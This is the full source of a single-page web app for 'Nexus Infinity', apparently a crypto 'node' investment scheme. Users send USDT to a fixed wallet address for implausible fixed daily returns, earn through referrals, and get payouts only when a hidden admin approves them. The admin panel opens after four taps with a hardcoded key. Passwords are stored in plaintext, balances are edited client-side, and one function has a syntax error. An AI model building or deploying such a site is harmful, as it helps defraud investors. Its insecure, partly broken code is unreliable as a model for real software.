<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NEXUS INFINITY | Global Empire Terminal</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;500;700;800&family=Syncopate:wght@700&display=swap');
        :root { --n-pink: #ff00ff; --n-blue: #00d4ff; --bg: #0d0f14; }
        body { background: var(--bg); color: #e2e8f0; font-family: 'Plus Jakarta Sans', sans-serif; margin: 0; overflow-x: hidden; }
        .glass { background: rgba(255, 255, 255, 0.07); backdrop-filter: blur(40px); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 30px; }
        .btn-grad { background: linear-gradient(135deg, #ff00ff, #00d4ff); color: white; font-weight: 800; padding: 18px; border-radius: 20px; transition: 0.3s; text-transform: uppercase; letter-spacing: 1px; width: 100%; }
        .input-hub { background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 18px; padding: 16px; color: white; width: 100%; outline: none; }
        .nav-item { color: #64748b; transition: 0.3s; text-align: center; flex: 1; cursor: pointer; }
        .nav-active { color: #fff; transform: translateY(-5px); }
        .nav-active i { color: var(--n-pink); filter: drop-shadow(0 0 8px var(--n-pink)); }
        .hidden { display: none !important; }
        @keyframes marquee { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
        .broadcast { white-space: nowrap; animation: marquee 15s linear infinite; }
    </style>
</head>
<body class="bg-slate-950">

    <div class="fixed top-0 left-0 right-0 z-[60] bg-black/40 backdrop-blur-md border-b border-white/5 h-8 overflow-hidden flex items-center">
        <div id="broadcast-msg" class="broadcast text-[10px] font-bold text-blue-400 uppercase tracking-widest">
            Welcome to Nexus Infinity Global. New Nodes S-15 are now live. Secure your assets today.
        </div>
    </div>

    <div id="splash" class="fixed inset-0 bg-[#0d0f14] z-[9999] flex flex-col items-center justify-center">
        <div class="w-20 h-20 bg-gradient-to-tr from-pink-500 to-blue-500 rounded-3xl flex items-center justify-center text-4xl font-black italic shadow-2xl animate-pulse">N</div>
        <h1 style="font-family: 'Syncopate'" class="mt-6 text-[10px] tracking-[0.5em] text-white">NEXUS INFINITY</h1>
    </div>

    <div id="auth-section" class="min-h-screen flex items-center justify-center p-8 hidden">
        <div class="max-w-sm w-full glass p-10 space-y-6">
            <h2 class="text-center font-black italic uppercase tracking-tighter text-xl">System <span class="text-pink-500">Entry</span></h2>
            <div id="login-ui" class="space-y-4">
                <input type="text" id="l-user" placeholder="Account ID" class="input-hub">
                <input type="password" id="l-pass" placeholder="Access Key" class="input-hub">
                <button onclick="handleLogin()" class="btn-grad">Authorize</button>
                <p onclick="toggleAuth(true)" class="text-center text-[9px] text-zinc-500 font-black uppercase cursor-pointer">Register New Node ID</p>
            </div>
            <div id="signup-ui" class="space-y-4 hidden">
                <input type="text" id="s-user" placeholder="Username" class="input-hub">
                <input type="password" id="s-pass" placeholder="Password" class="input-hub">
                <input type="text" id="s-ref" placeholder="Referral ID" class="input-hub">
                <button onclick="handleSignup()" class="btn-grad">Initialize</button>
                <p onclick="toggleAuth(false)" class="text-center text-[9px] text-zinc-500 font-black uppercase cursor-pointer">Back to Hub</p>
            </div>
        </div>
    </div>

    <div id="dashboard" class="hidden pb-32 pt-12">
        <header class="p-6 flex justify-between items-center sticky top-8 bg-slate-950/80 backdrop-blur-xl z-50">
            <div class="flex items-center gap-3">
                <div id="admin-trigger" class="w-10 h-10 bg-white/5 rounded-xl border border-white/10 flex items-center justify-center font-black italic">N</div>
                <div>
                    <p id="nav-user" class="text-xs font-black text-pink-500 uppercase leading-none">...</p>
                    <p class="text-[7px] text-green-500 font-bold uppercase mt-1">Verified Node</p>
                </div>
            </div>
            <div class="flex gap-4 items-center">
                <a href="https://t.me/NexusInfinityUpdates" target="_blank" class="text-blue-400 text-xl"><i class="fa-brands fa-telegram"></i></a>
                <button onclick="logout()" class="text-zinc-600"><i class="fa-solid fa-power-off text-xl"></i></button>
            </div>
        </header>

        <main id="page-home" class="p-6 space-y-6">
            <div class="glass p-8 bg-gradient-to-br from-white/10 to-transparent">
                <p class="text-[8px] font-black text-zinc-500 uppercase tracking-widest">Total Asset Equity</p>
                <h2 id="balance-txt" class="text-5xl font-black italic tracking-tighter">$0.00</h2>
                <div class="mt-8 flex justify-between border-t border-white/5 pt-6">
                    <div><p class="text-[7px] text-zinc-500 uppercase font-black">Daily Profit</p><p id="profit-txt" class="text-lg font-black text-pink-500">+$0.00</p></div>
                    <div class="text-right"><p class="text-[7px] text-zinc-500 uppercase font-black">Invite Code</p><p id="my-ref" class="text-[10px] font-black text-blue-400 uppercase">...</p></div>
                </div>
            </div>

            <div class="glass p-5 flex gap-3">
                <input type="text" id="promo-input" placeholder="Enter Promo Code" class="input-hub !py-3 !text-[10px]">
                <button onclick="applyPromo()" class="btn-grad !w-auto !px-6 !py-3 !text-[9px]">Apply</button>
            </div>

            <div id="active-nodes-list" class="grid gap-4"></div>
        </main>

        <main id="page-market" class="p-6 space-y-6 hidden">
            <h3 class="text-xl font-black italic text-pink-500 uppercase">Node Marketplace</h3>
            <div id="market-list" class="grid gap-4"></div>
        </main>

        <main id="page-vault" class="p-6 space-y-8 hidden">
            <div class="glass p-8 space-y-6">
                <h3 class="text-lg font-black italic text-pink-500 uppercase">Deposit</h3>
                <div class="space-y-3">
                    <div class="bg-black/40 p-4 rounded-2xl border border-white/5 text-[9px] font-bold select-all break-all">USDT (TRC20): TAvfQQ18hXHdVCHbExV4yUPvQ4XkNgfKsJ</div>
                </div>
                <input type="number" id="dep-amt" placeholder="Amount ($)" class="input-hub">
                <input type="text" id="dep-tid" placeholder="Transaction Hash (TID)" class="input-hub">
                <input type="file" id="dep-proof" accept="image/*" class="text-[10px] block w-full file:bg-zinc-800 file:border-0 file:rounded-full file:px-4">
                <img id="preview-img" class="mt-4 w-full h-32 rounded-3xl object-cover hidden">
                <button onclick="submitDep()" class="btn-grad">Submit Request</button>
            </div>
            <div class="glass p-8 space-y-6">
                <h3 class="text-lg font-black italic uppercase">Withdraw</h3>
                <input type="text" id="w-addr" placeholder="Wallet Address" class="input-hub">
                <input type="number" id="w-amt" placeholder="Amount ($)" class="input-hub">
                <button onclick="submitWith()" class="btn-grad !bg-zinc-800">Request Payout</button>
            </div>
        </main>

        <main id="page-history" class="p-6 space-y-4 hidden">
            <div class="flex justify-between items-center">
                <h3 class="text-lg font-black italic uppercase">Activity Logs</h3>
                <button onclick="clearUserHistory()" class="text-[8px] font-black uppercase text-red-500 px-3 py-1 bg-red-500/10 rounded-full">Clear All</button>
            </div>
            <div id="history-list" class="grid gap-3"></div>
        </main>

        <nav class="fixed bottom-0 left-0 right-0 p-6 bg-slate-950/90 backdrop-blur-3xl border-t border-white/5 flex justify-around items-center z-[1000]">
            <div onclick="switchPage('home')" class="nav-item nav-active"><i class="fa-solid fa-bolt text-xl"></i><p class="font-black uppercase text-[7px] mt-1">Core</p></div>
            <div onclick="switchPage('market')" class="nav-item"><i class="fa-solid fa-microchip text-xl"></i><p class="font-black uppercase text-[7px] mt-1">Market</p></div>
            <div onclick="switchPage('vault')" class="nav-item"><i class="fa-solid fa-vault text-xl"></i><p class="font-black uppercase text-[7px] mt-1">Vault</p></div>
            <div onclick="switchPage('history')" class="nav-item"><i class="fa-solid fa-clock-rotate-left text-xl"></i><p class="font-black uppercase text-[7px] mt-1">Logs</p></div>
        </nav>
    </div>

    <div id="admin-panel" class="fixed inset-0 bg-slate-950 z-[10000] p-8 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-8 border-b border-white/10 pb-4">
            <h2 class="text-xl font-black italic text-pink-500 uppercase">Master Panel</h2>
            <button onclick="document.getElementById('admin-panel').classList.add('hidden')" class="text-3xl">&times;</button>
        </div>
        <div class="space-y-6">
            <div class="glass p-6 space-y-4">
                <h4 class="text-[10px] font-black uppercase text-zinc-500">Update Broadcast</h4>
                <input type="text" id="adm-broadcast" placeholder="Global Message..." class="input-hub">
                <button onclick="updateBroadcast()" class="btn-grad !py-3">Update System Message</button>
            </div>
            <div id="admin-requests" class="space-y-4"></div>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getDatabase, ref, set, get, onValue, push, update, remove } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        const firebaseConfig = { apiKey: "AIzaSyDaOGSlBjS7_pQX9ELAytXVF4jvWK_lzB0", authDomain: "live-54fb4.firebaseapp.com", databaseURL: "https://live-54fb4-default-rtdb.firebaseio.com", projectId: "live-54fb4", storageBucket: "live-54fb4.firebasestorage.app", messagingSenderId: "781910562842", appId: "1:781910562842:web:07a887f860d30fd17d99a3" };
        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        // 20 Nodes with Professional Visuals
        const marketNodes = Array.from({length: 20}, (_, i) => ({
            id: i+1,
            title: i < 10 ? `Nexus Core S-${i+1}` : `Infinity Elite X-${i-9}`,
            price: i < 10 ? (i+1)*20 : (i-9)*350,
            daily: i < 10 ? (i+1)*1.5 : (i-9)*45,
            days: i < 10 ? 30 : 60,
            image: `https://picsum.photos/seed/${i+100}/400/200`
        }));

        window.onload = () => {
            renderMarket();
            onValue(ref(db, 'system/broadcast'), (s) => document.getElementById('broadcast-msg').innerText = s.val() || "Welcome to Nexus Infinity Global.");
            setTimeout(() => {
                document.getElementById('splash').style.display = 'none';
                const u = localStorage.getItem('nexus_user');
                if(u) showDashboard(u); else document.getElementById('auth-section').classList.remove('hidden');
            }, 2000);
        };

        function renderMarket() {
            document.getElementById('market-list').innerHTML = marketNodes.map(n => `
                <div class="glass overflow-hidden">
                    <img src="${n.image}" class="w-full h-32 object-cover opacity-60">
                    <div class="p-6 flex justify-between items-center">
                        <div><h4 class="font-black italic uppercase text-sm">${n.title}</h4><p class="text-[10px] font-bold text-green-500">$${n.daily.toFixed(2)}/Day • ${n.days}D</p></div>
                        <div class="text-right"><p class="font-black text-xl">$${n.price}</p><button onclick="buyNode(${n.id})" class="mt-2 px-6 py-1.5 bg-white text-black text-[9px] font-black uppercase rounded-xl">Deploy</button></div>
                    </div>
                </div>`).join('');
        }

        window.buyNode = async (id) => {
            const user = localStorage.getItem('nexus_user'), node = marketNodes.find(x => x.id === id), s = await get(ref(db, `users/${user}`));
            if((s.val().balance || 0) < node.price) return alert("Low Equity!");
            const start = Date.now();
            await update(ref(db, `users/${user}`), { balance: s.val().balance - node.price });
            await set(push(ref(db, `users/${user}/nodes`)), { ...node, startTime: start, expires: start + (node.days * 86400000), lastClaim: start });
            alert("Node Online!"); switchPage('home');
        };

        function showDashboard(uid) {
            document.getElementById('auth-section').classList.add('hidden');
            document.getElementById('dashboard').classList.remove('hidden');
            document.getElementById('nav-user').innerText = uid;
            document.getElementById('my-ref').innerText = uid;

            onValue(ref(db, `users/${uid}`), (snap) => {
                const d = snap.val(); if(!d) return;
                document.getElementById('balance-txt').innerText = '$' + (d.balance || 0).toFixed(2);
                document.getElementById('profit-txt').innerText = '+$' + (d.profit || 0).toFixed(2);
                
                const hist = d.history ? Object.values(d.history).reverse() : [];
                document.getElementById('history-list').innerHTML = hist.map(h => `
                    <div class="glass p-5 border-l-4 ${h.status === 'Approved' ? 'border-green-500' : 'border-pink-500'} flex justify-between items-center">
                        <div><p class="text-[9px] font-black uppercase tracking-widest">${h.type}</p><p class="text-[7px] text-zinc-500">${h.date}</p></div>
                        <div class="text-right"><p class="text-[10px] font-black">$${h.amount}</p><p class="text-[7px] font-bold uppercase ${h.status === 'Approved' ? 'text-green-500' : 'text-pink-500'}">${h.status}</p></div>
                    </div>`).join('') || '<p class="text-center opacity-20 py-10 text-[9px] font-black uppercase">Grid Empty</p>';

                const nodes = d.nodes ? Object.entries(d.nodes) : [];
                document.getElementById('active-nodes-list').innerHTML = nodes.map(([k, n]) => {
                    const rem = Math.max(0, n.expires - Date.now()), hours = Math.floor(rem / 3600000);
                    if(Date.now() - n.lastClaim >= 86400000) {
                        update(ref(db, `users/${uid}`), { profit: (d.profit || 0) + n.daily });
                        update(ref(db, `users/${uid}/nodes/${k}`), { lastClaim: Date.now() });
                    }
                    return `<div class="glass p-6 border-l-4 border-blue-500 flex justify-between items-center">
                        <div><h4 class="text-[10px] font-black uppercase tracking-widest">${n.title}</h4><p class="text-[8px] font-bold text-zinc-500">Daily: $${n.daily.toFixed(2)}</p></div>
                        <div class="text-right"><p class="text-[8px] font-black text-blue-500 animate-pulse italic">DEPLOYED</p><p class="text-[7px] text-zinc-500 mt-1">${hours}H TIMER</p></div>
                    </div>`;
                }).join('') || '<p class="text-center opacity-20 py-10 text-[9px] font-black uppercase">No Active Nodes</p>';
            });
        }

        window.submitDep = async () => {
            const user = localStorage.getItem('nexus_user'), amt = document.getElementById('dep-amt').value, tid = document.getElementById('dep-tid').value, proof = document.getElementById('preview-img').src;
            if(!amt || !tid || !proof) return alert("Missing Data!");
            const hRef = push(ref(db, `users/${user}/history`));
            const entry = { user, amount: amt, tid, proof, status: 'Pending', date: new Date().toLocaleString(), type: 'Deposit', hKey: hRef.key };
            await set(hRef, entry); await set(ref(db, 'admin/requests/' + hRef.key), entry);
            alert("Deposit Logged.");
        };

        window.clearUserHistory = async () => {
            const user = localStorage.getItem('nexus_user');
            if(confirm("Permanently clear activity logs?")) await remove(ref(db, `users/${user}/history`));
        };

        window.updateBroadcast = async () => {
            const msg = document.getElementById('adm-broadcast').value;
            await set(ref(db, 'system/broadcast'), msg);
            alert("Broadcast Updated Globally.");
        };

        window.manage = async (id, user, amt, hKey, action) => {
            if(action === 'approve') {
                const s = await get(ref(db, `users/${user}`));
                await update(ref(db, `users/${user}`), { balance: (s.val().balance || 0) + parseFloat(amt) });
                await update(ref(db, `users/${user}/history/${hKey}`), { status: 'Approved' });
            } else await update(ref(db, `users/${user}/history/${hKey}`), { status: 'Rejected' });
            await remove(ref(db, 'admin/requests/' + id));
        };

        function loadAdmin() {
            onValue(ref(db, 'admin/requests'), (snap) => {
                const d = snap.val();
                document.getElementById('admin-requests').innerHTML = d ? Object.entries(d).map(([id, l]) => `
                    <div class="glass p-6 space-y-4 border border-pink-500/20">
                        <div class="flex justify-between items-center text-[9px] font-black uppercase"><span class="text-pink-500">${l.type}</span><span class="text-zinc-600">${l.date}</span></div>
                        <p class="text-[10px]">USER: <b>${l.user}</b> | AMT: <b>$${l.amount}</b> | TID: <b>${l.tid || 'N/A'}</b></p>
                        ${l.proof ? `<img src="${l.proof}" class="w-full h-40 object-cover rounded-3xl border border-white/10" onclick="window.open(this.src)">` : `<p class="text-[8px] break-all">${l.address}</p>`}
                        <div class="grid grid-cols-2 gap-4"><button onclick="manage('${id}','${l.user}',${l.amount},'${l.hKey}','approve')" class="bg-green-600/30 text-green-500 py-4 rounded-2xl text-[9px] font-black uppercase">Approve</button><button onclick="manage('${id}','${l.user}',${l.amount},'${l.hKey}','reject')" class="bg-red-600/30 text-red-500 py-4 rounded-2xl text-[9px] font-black uppercase">Reject</button></div>
                    </div>`).join('') : '<p class="text-center opacity-30 py-20 font-black text-[10px] uppercase">No Pending Tasks</p>';
            });
        }

        document.getElementById('dep-proof').onchange = (e) => { const r = new FileReader(); r.readAsDataURL(e.target.files[0]); r.onload = () => { document.getElementById('preview-img').src = r.result; document.getElementById('preview-img').classList.remove('hidden'); }; };
        let taps = 0; document.getElementById('admin-trigger').onclick = () => { taps++; if(taps === 4) { if(prompt("Key:") === "coin786") { document.getElementById('admin-panel').classList.remove('hidden'); loadAdmin(); } taps = 0; } };
        window.switchPage = (p) => { ['home','market','vault','history'].forEach(x => document.getElementById('page-'+x).classList.add('hidden')); document.getElementById('page-'+p).classList.remove('hidden'); document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('hidden'); document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('nav-active')); event.currentTarget.classList.add('nav-active'); };
        window.handleLogin = async () => { const u = document.getElementById('l-user').value.trim(), p = document.getElementById('l-pass').value.trim(), s = await get(ref(db, `users/${u}`)); if(s.exists() && s.val().password === p) { localStorage.setItem('nexus_user', u); showDashboard(u); } else alert("Access Denied!"); };
        window.handleSignup = async () => { const u = document.getElementById('s-user').value.trim(), p = document.getElementById('s-pass').value.trim(), r = document.getElementById('s-ref').value.trim(); await set(ref(db, `users/${u}`), { username: u, password: p, balance: 0, profit: 0, referredBy: r }); alert("Protocol Initialized!"); toggleAuth(false); };
        window.toggleAuth = (s) => { document.getElementById('login-ui').classList.toggle('hidden', s); document.getElementById('signup-ui').classList.toggle('hidden', !s); };
        window.logout = () => { localStorage.clear(); location.reload(); };
        window.submitWith = async () => { const u = localStorage.getItem('nexus_user'), amt = document.getElementById('w-amt').value, adr = document.getElementById('w-addr').value; const hRef = push(ref(db, `users/${u}/history`)); await set(hRef, { user: u, amount: amt, address: adr, status: 'Pending', date: new Date().toLocaleString(), type: 'Withdrawal', hKey: hRef.key }); await set(ref(db, 'admin/requests/' + hRef.key), { user: u, amount: amt, address: adr, status: 'Pending', date: new Date().toLocaleString(), type: 'Withdrawal', hKey: hRef.key }); alert("Payout Requested."); };
    </script>
</body>
</html>
